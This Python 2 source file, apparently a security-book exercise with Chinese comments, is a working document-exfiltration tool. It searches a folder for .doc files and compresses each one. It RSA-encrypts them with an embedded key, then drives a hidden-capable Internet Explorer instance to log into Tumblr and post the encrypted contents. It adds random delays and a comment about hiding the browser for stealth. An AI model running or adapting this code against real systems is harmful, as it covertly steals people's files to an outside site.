#-*- coding:utf8 -*-  

"""
@version: 
@author: giantbranch
@file: ie_exfil.py
@time: 2016/3/11 23:13
"""

import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = ""
password = ""

public_key = "-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnqDNZMxg2xp620nt0QTwJ0Bv7pRJvdV0Yems1JxnOqA3uCrdZe/fXpD7+kUFRZ6sCZnvcicuyGDMKszvIK75/QWLLCIoMt5cPk1gqsN1djFmG95k63Z/fU1CZbcWa3Kdzo5Ca0Mu262y/n0q5r8TT4khKNOsjeyup1Fk3ll+/DrUrMqxXmX6YK/tGtJhzT+wK55zoZakVR+9S8wHQq27Y+y2xhS2aq1sxZEnYM3/MGerH8nRZZ4WLf2bqMUHywT80cVCxkHb7J5dKNELx4PRIWPbYdmRxHljJpK2kt383yoIQihK5qKkj2SuBFsvoVNEwq4hzVGQTBNn43BRVj8BpwIDAQAB-----END PUBLIC KEY-----"


def wait_for_browser(browser):
    # 等待浏览器加载完一个页面
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return

def encrypt_string(plaintext):
    # 设置块大小
    chunk_size = 256
    print "Compressing: %d bytes" % len(plaintext)
    # 首先调用zlib进行压缩
    plaintext = zlib.compress(plaintext)

    print "Encrypting %d bytes" % len(plaintext)

    # 利用公钥建立RSA公钥加密对象
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = ""
    offset = 0

    # 对文件内容进行每256个字节为一块循环加密
    while offset < len(plaintext):
        # 获取某个256字节
        chunk = plaintext[offset:offset+chunk_size]
        # 若到最后不够256字节，则用空格补够
        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))
        # 将已加密的连起来
        encrypted += rsakey.encrypt(chunk)
        # 偏移增加
        offset += chunk_size
    # 对加密后的进行base64编码
    encrypted = encrypted.encode("base64")
    # 输出最后加密后的长度
    print "Base64 encodeed crypto: %d" % len(encrypted)
    # 返回加密后内容
    return encrypted

def encrypt_post(filename):

    # 打开并读取文件
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()
    # 分别加密文件名和内容
    encrypt_title = encrypt_string(filename)
    encrypt_body = encrypt_string(contents)

    return encrypt_title, encrypt_body

# 随机休眠一段时间
def random_sleep():
    time.sleep(random.randint(5,10))
    return

def login_to_tumblr(ie):

    # 解析文档中的所有元素
    full_doc = ie.Document.all
    # 迭代每个元素来查找登陆表单
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    try:
        # 你会遇到不同的登陆主页
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError, e:
        pass

    random_sleep()

    # 登陆表单是登陆页面的第二个表单
    wait_for_browser(ie)
    return

def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            i.focus()

    random_sleep()
    title_box.focus()
    random_sleep()

    post_form.childran[0].click()
    wait_for_browser(ie)

    random_sleep()

    return

def exfiltrate(document_path):
    # 创建IE实例化对象
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    # 调试阶段设置为1，实际设置为0，以增加隐蔽性
    ie.Visible = 1

    # 访问tumblr站点并登陆
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print "Logging in ..."
    login_to_tumblr(ie)
    print "Logged in ... navigating"

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # 加密文件
    title,body = encrypt_post(document_path)

    print "Creating new post..."
    post_to_tumblr(ie, title, body)
    print "Posted!"

    # 销毁IE实例
    ie.Quit()
    ie = None


# 用户文档检索的主循环
for parent, directories, filenames in os.walk("C:\\test\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent, filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        raw_input("Continue?")